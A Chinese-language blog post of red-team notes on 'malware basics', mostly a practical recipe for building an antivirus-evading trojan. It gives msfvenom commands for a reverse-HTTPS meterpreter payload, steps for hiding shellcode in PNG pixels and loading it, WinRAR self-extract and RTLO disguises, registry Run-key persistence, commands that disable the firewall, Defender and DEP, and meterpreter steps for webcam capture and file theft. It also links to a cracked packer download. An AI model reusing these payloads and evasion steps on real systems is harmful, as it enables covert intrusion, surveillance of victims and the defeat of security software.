---
layout: post
title: "【网络安全】恶意软件基础"
date: 2025-02-21
author: "3thernet"
header-img: "img/city-2.jpg"
tags: []
---

综合文章：

[红队技术 - 钓鱼手法及木马免杀技巧 | Hyyrent blog](https://pizz33.github.io/posts/53de6033c423/)

免杀工具：

[1y0n/AV_Evasion_Tool： 掩日 - 免杀执行器生成工具](https://github.com/1y0n/AV_Evasion_Tool)

[LOLBAS](https://lolbas-project.github.io/)

[Windows上传并执行恶意代码的N种姿势-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1141143) 白名单文件常被LNK攻击利用

[远控免杀从入门到实践之白名单（113个）总结篇 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/232074.html)

[Wmic.exe - iNotes](https://ihsansencan.github.io/privilege-escalation/windows/binaries/wmic-exe.html)

样本分析：

[2023011603.pdf](https://wtc.antiy.cn/download/2023011603.pdf)

[黑产组织攻击样本的一些对抗技术 - 先知社区](https://xz.aliyun.com/t/13705?time__1311=GqmxuQD%3DW4cDlxGgx%2BxCwh4joO5Wq6Y63x)

[银狐猎影：深度揭示银狐团伙技战法 - 安全内参 | 决策者的网络安全知识库](https://www.secrss.com/articles/60688)

[Windows 操作系统考古学 |PPT |免费下载](https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology)

## 一、制作免杀木马：

用reverse_https能够避免被windows defender动态查杀

1、自签名证书

`openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout ssl.pem -out ssl.pem -subj "/CN=mydomain.com"`

2、hex shellcode：

`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=xxxx HandlerSSLCert=ssl.pem -f hex -o shellcode.txt`

~~根据需要加入多次编码，防止shellcode被标记`-e x86/shikata_ga_nai -i 30`~~

多次测试发现reverse_https无法编码，请通过重新生成证书来防止被标记，执行migrate和shell会触发Windows Defender运行时扫描，很大可能性被杀，这样子也没有办法派生shell给cobaltstrike

meterpreter监听时：

set EnableStageEncoding true

set stageencoder x86/fnstenv_mov

set AutoRunScript "migrate -n explorer.exe" 测试经常来不及转移就会被查杀

set ExitOnSession false //可以在接收到session后继续监听端口，保持侦听

这些在show advanced查看

~~我这里用了frp端口转发，所以监听的是本地127.0.0.1~~

[绕过 Windows Defender 运行时扫描 |WithSecure™ 实验室](https://labs.withsecure.com/publications/bypassing-windows-defender-runtime-scanning)

### RGB通道隐写

PNG每个像素有四个通道，每个通道（字节）低2位可以写入2bit数据

`gcc encrypt_image.c -o encrypt.exe`

`.\encrypt.exe` 确保输入文件名为`input_image.png`和`shellcode.txt`，输出文件为`output_image.png`，命令行输出shellcode长度

`gcc decrypt_image.c -o decrypt.exe`

### 编译主程序

修改play.cpp中的`int size`为上面输出的shellcode长度，还有文件名const char *filename，编写cpp翻译加载shellcode，使用了开源lazy_importer库防止静态检测`VirtualAlloc`函数，还加入了三个junkfunction，这些垃圾函数可以随意修改顺序和数量来生成md5不一致的可执行文件

`g++ play3.cpp -o Beacon.exe -lwsock32 -static -static-libgcc -static-libstdc++`

静态编译是否有坏处？

参考：

- [Shellcode分离加载实现免杀的两种方式(VT免杀率:1/68) - 亨利其实很坏 - 博客园](https://www.cnblogs.com/henry666/p/17428579.html)

静态免杀：

[免杀入门:Windows静态检测规避](https://mp.weixin.qq.com/s/edOQpoc4W1DYpkD_6UDTHw)

- 特征码：一般指特定的程序指令集或敏感字符串，比如CS的原生beacon、mimikatz的作者注释信息等。特征码的定位可以用MYCCL工具对木马文件进行分块，将0x00覆盖到文件分块中，如果此时文件不报毒，说明白覆盖地方存在特征码，除此之外还可以用Virtest工具自动定位特征码。

- IOC标志：一般指已经被威胁情报平台拉黑的IP或者域名，VirusTotal等平台暴露的恶意样本的md5值。

- PE文件导入表的敏感API函数：如VirtualAlloc、VirtualProtect、CreateThread等。杀软不会立刻将导入敏感API函数的PE文件判断为恶意程序，但是它后续会重点监控这些PE文件的行为。

### LNK攻击

[钓鱼攻击之：Lnk 文件钓鱼 - f_carey - 博客园](https://www.cnblogs.com/f-carey/p/16542156.html)

[发现新招！攻击者投递伪装成文件夹的恶意LNK_.lnk执行ddl文件-CSDN博客](https://blog.csdn.net/m0_61869253/article/details/132829953)

[LNK 类恶意软件兴起 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/338683.html) 混淆指令

[奇安信攻防社区-【Web实战】钓鱼手法及木马免杀技巧](https://forum.butian.net/share/2532)

## 二、Winrar自解压

Winrar压缩功能可以设置自动解压并且自动运行里面的程序，使用自解压功能会把文件制作成exe程序，运行后将文件解压到指定路径，并运行指定文件。

[在线生成透明ICO图标——ICO图标制作](https://www.ico51.cn/)

参考：

- [ATT&CK防御绕过-木马隐藏捆绑技术-winrar自解压和文件名反转_反转文件名-CSDN博客](https://blog.csdn.net/u013797594/article/details/124671389)

这里必须额外把`png`替换成相似文本才能绕过Windows Defender：

- [虚假文本生成器—LZL在线工具](https://www.lzltool.com/Toolkit/GenerateFakeText)

远程vps: 6666端口

虚拟机kali: 8888端口，frp连接

### 捆绑释放

[攻防 | 红队钓鱼技术剖析与防范-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2333003)

常用的捆绑方式是将木马文件添加到正常的可执行文件尾部，当正常文件执行的时候，将木马同时执行，这种技术已经比较普遍过时，捆绑非免杀马的情况下很容易被杀软识别。<mark>利用二禁止文件编辑器搜索PE文件头。如果找到两个以上，就基本证明存在捆绑文件。</mark>当然有其他的捆绑形式，如将木马捆绑在图片上、PDF、Word文档、Excel中，更利于引诱目标点击，目标点击执行后，木马在后台执行并使主机上线，捆绑文件则被正常加载。如下图_Manage_bind.exe为捆绑后的文件，运行后木马上线并逃逸到指定位置。捆绑程序正常执行。

木马伪装、捆绑技术在一般情况下只是为了隐藏木马，真正目的并非通过捆绑静态免杀。当捆绑被执行，木马与捆绑文件分离后，使用的木马文件将原原本本暴漏在杀软面前，若捆绑前不是免杀马，执行后同样会被杀软杀掉。

[实战 | 记一次Word文档网络钓鱼以及绕过火绒，电脑管家和Windows Defender |](https://www.moonsec.com/7811.html)

### 自删除

[自删除EXE程序 - 技术宅的结界 - Powered by Discuz!](https://www.0xaa55.com/thread-16863-1-1.html)

## 三、RTLO

[Bypass Defender and other thoughts on Unicode RTLO attacks - [ Sevagas]](https://blog.sevagas.com/?Bypass-Defender-and-other-thoughts-on-Unicode-RTLO-attacks)

加入一些不可见空格可以绕过Windows Defender检测

[Initial Access - Right-To-Left Override [T1036.002] · Ex Android Dev](https://www.exandroid.dev/2022/03/21/initial-access-right-to-left-override-t1036002/)

也可以使用EXe绕过

可以多次使用反转：

[字符串翻转之谜_u2067-CSDN博客](https://blog.csdn.net/a_void/article/details/106383456)

| \u202D | \u202C | 之间的字符按照内存中的顺序，从左到右显示 |
| ------ | ------ | ---------------------------------------- |
| \u202E | \u202C | 之间的字符按照内存中的顺序，从右到左显示 |

## 四、隐藏命令窗口

BAT、VBS都可以

EXE源码加入：（我试用后发现无效）

`#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )`

[自解压、免杀、P2P传播，全能挖矿病毒GroksterMiner来袭_tmp](https://www.sohu.com/a/333383855_120136504)

[在Windows下运行命令行程序，如何才能不显示命令行窗口，让程序保持后台运行？_如何让cmd命令运行时不显示窗口-CSDN博客](https://blog.csdn.net/quicmous/article/details/136420097)

[让bat、exe、msi、dos等静默运行，后台运行，不弹窗的解决办法 - YiluPHP](https://www.yiluphp.com/article/detail/426)

### VBS

[从另一个 vbscript 运行 vbscript - Stack Overflow](https://stackoverflow.com/questions/1686454/run-a-vbscript-from-another-vbscript)

## 五、绕过动态查杀

[Bypassing Windows Defender Runtime Scanning | WithSecure™ Labs](https://labs.withsecure.com/publications/bypassing-windows-defender-runtime-scanning)

Meterpreter 会话仅在使用 shell/execute 时被杀死，因此此活动似乎触发了扫描。

为了尝试理解这种行为，我们检查了 Metasploit 源代码，发现 Meterpreter 使用 CreateProcess API 来启动新进程。

大多数测试函数都没有触发扫描事件，只有 CreateProcess 和 CreateRemoteThread 导致触发扫描。这可能是有道理的，因为许多测试的 API 经常使用，如果每次调用其中一个 API 时都会触发扫描，Windows Defender 将持续扫描并可能影响系统性能。

我们只需要在调用可疑 API 时动态设置`PAGE_NO_ACCESS`，然后在扫描完成后将其恢复。

可以用`HOOK`的方法来让Meterpreter绕过扫描，或者注入到不会触发Windows Defender的进程：

- explorer.exe

- smartscreen.exe

编写一个名为 Ninjasploit 的自定义 Metasploit 扩展用作绕过 Windows Defender 的漏洞利用后扩展。该扩展提供了两个命令 install_hooks 和 restore_hooks 实现前面描述的内存修改旁路。可在此处找到扩展：[GitHub - FSecureLABS/Ninjasploit: A meterpreter extension for applying hooks to avoid windows defender memory scans](https://github.com/FSecureLABS/Ninjasploit)

[Windows Defender Memory Scanning Evasion < BorderGate](https://www.bordergate.co.uk/windows-defender-memory-scanning-evasion/) 类似上文，有代码

有的时候meterpreter的unhook扩展起作用，能够迁移，但有的时候不行

### Cobalt Strike表现

[Cobalt Strike已死？如何真正意义上的入门免杀-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2397042)

[利用 Cobalt Strike Profiles 的强大功能进行 EDR 规避 |kleiton0x7e](https://kleiton0x00.github.io/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/) sleepmask

## 六、Shellcode加载器

### 分离加载

目前的已经写好的原始加载器是分离加载，但是很容易被动态查杀（meterpreter执行shell或者migrate命令），要么用上面的Hook方法，要么选择进程镂空、APC等方法绕过

[Shellcode分离加载实现免杀的两种方式(VT免杀率:1/68) - 亨利其实很坏 - 博客园](https://www.cnblogs.com/henry666/p/17428579.html)

### 进程注入&镂空

[进程镂空注入(傀儡进程) | Henry's Blog](https://www.henry-blog.life/henry-blog/shellcode-jia-zai-qi/jin-cheng-lou-kong-zhu-ru-kui-lei-jin-cheng)

[进程注入-PE注入 | CN-SEC 中文网](https://cn-sec.com/archives/2021095.html)

https://mp.weixin.qq.com/s/UqU5asYyKI3uF8Fv3RDZnw 进程注入系列Part 1 常见的进程注入手段

https://mp.weixin.qq.com/s/0mnEk3e8KMw5CYDE3fRVzA MITRE ATT&CK T1055 工艺注入

https://mp.weixin.qq.com/s/pyALO84x82aPb10AqV1eKA 使用进程镂空技术免杀360Defender，推荐看，镂空winlogon.exe会报警但是不会被杀

https://mp.weixin.qq.com/s/EbBB53OdOZD4bve4vUkVgA 含完整代码，可参考

下面两篇文章比较乱，不推荐看：

[[原创]Windows进程注入详解（一）-编程技术-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-279988.htm)

[Shellcode注入总结 - 小新07 - 博客园](https://www.cnblogs.com/xiaoxin07/p/18097443)

## 七、反沙箱

sleep，质数运算，内存大小，CPU核心数

[反沙箱和反调试总结 - fdx_xdf - 博客园](https://www.cnblogs.com/fdxsec/p/17963985) 好文

https://mp.weixin.qq.com/s/4K8VrndSIGLcbTyKQeZVkw

[沙箱对抗之反沙箱技巧-CSDN博客](https://blog.csdn.net/SHELLCODE_8BIT/article/details/133928413)

[一次沙箱分析记录 - 先知社区](https://xz.aliyun.com/t/13256?time__1311=GqmxuD0DnCG%3DDsA5YK0%3DIoAKeYv4rxx8bD)

[云沙箱流量识别技术剖析](https://blog.noah.360.net/yun-sha-xiang-liu-liang-shi-bie-ji-zhu-pou-xi/)

遮天：[遮天 实战绕过卡巴斯基、Defender上线CS和MSF及动态命令执行..._遮天免杀-CSDN博客](https://blog.csdn.net/heartsk/article/details/128043127)

[流程缓解政策和 ACG < BorderGate](https://www.bordergate.co.uk/process-mitigation-policies-acg/)

## 八、反调试

### 加壳

upx会被直接杀，vmprotect采用虚拟化技术，很难分析

[VMProtect Ultimate v3.8.4 Build 1754 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1890105-1-1.html)

下载：https://down.52pojie.cn/Tools/Packers/VMProtect_Ultimate_v3.8.4_Build_1754_Retail_Licensed.rar

[一个给新手进阶的IAT加密壳 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/235918.html)

## 九、杂项

[红队技术 - 隐藏上传的程序木马 | Hyyrent blog](https://pizz33.github.io/posts/ffbd3579f38f/)

- 伪造签名：https://github.com/secretsquirrel/SigThief

- 深度隐藏：`attrib +s +h +r xxx.exe`

- 修改文件时间，防止`everything`筛选

## 十、Meterpreter

- use unhook

- ps | grep "explorer.exe"

- migrate xxxx （高危）

- screenshot

- screenshare （不一定来得及）

- search/download

- sysinfo

- getuid, getprivs

- webcam_list 列出摄像头

- webcam_snap

- webcam_stream

- reg createkey -k "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"   -v "Normal" -t "REG_SZ" -d "%AppData%\Honkai.vbs"

- search -f *.docx

解决shell乱码：chcp 65001

关闭防火墙：netsh advfirewall set allprofiles state off

关闭Defender：net stop windefend

关闭DEP：Bcdedit.exe /set {current} nx AlwaysOff

[meterpreter命令总结 - Leticia's Blog](https://uuzdaisuki.com/2020/08/04/meterpreter%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/)

## 十一、会话传递

[Cobaltstrike 学习笔记（三）CS与MSF联动-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2148912)

msf使用exploit/windows/local/payload_inject模块传递会话给CS，这也是一个危险操作，会被Defender查杀

[MSF 作战手册及联动 CobaltStrike | 离沫凌天๓](https://www.lintstar.top/2021/06/cc6d559a#%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97%EF%BC%88Post%EF%BC%89)

## 十二、权限维持

[BorderGate <持久性机制](https://www.bordergate.co.uk/persistence-mechanisms/)

### 注册表后门

HKCU

计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Runs

[Window权限维持（一）：注册表运行键 - Bypass - 博客园](https://www.cnblogs.com/xiaozi/p/11798030.html)

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   /v "Keyname" /t REG_SZ /d "C:\test.bat" /f

[权限维持及后门持久化技巧总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/229209.html)

### 计划任务

<mark>如何自动化？</mark>

[Metasploit 的 persistence_exe 模块 - Kali Linux 2018：Windows 渗透测试 - 第二版 [书籍]](https://www.oreilly.com/library/view/kali-linux-2018/9781788997461/b8cfa9cd-94f8-452e-b91a-011e62c8b37b.xhtml)  这个模块似乎需要SYSTEM权限？

### DLL劫持（白加黑）

## 十三、加密硬盘

## 十四、隐藏C2

[利用CDN、域前置、重定向三种技术隐藏C2的区别_域前置与cdn区别-CSDN博客](https://blog.csdn.net/qq_41874930/article/details/109008708)

[C2服务器隐藏真实ip – 苦海](https://www.kitsch.life/2021/04/14/c2%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9Eip/)

## 十五、提权（可选）

[BC-SECURITY/Moriarty: Moriarty is designed to enumerate missing KBs, detect various vulnerabilities, and suggest potential exploits for Privilege Escalation in Windows environments.](https://github.com/BC-SECURITY/Moriarty)

[RalfHacker/CVE-2024-26229-漏洞：Windows LPE](https://github.com/RalfHacker/CVE-2024-26229-exploit)

[Windows CSC提权漏洞复现（CVE-2024-26229） - CVE-柠檬i - 博客园](https://www.cnblogs.com/CVE-Lemon/p/18254117)

[深入解析：Windows 提权技术全攻略 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/405941.html)

[系统服务替换提权-CSDN博客](https://blog.csdn.net/weixin_46686336/article/details/134398219)

[Windows提权-系统服务提权 - Yuy0ung - 博客园](https://www.cnblogs.com/yuy0ung/articles/18452396)

新：CVE-2025-21420
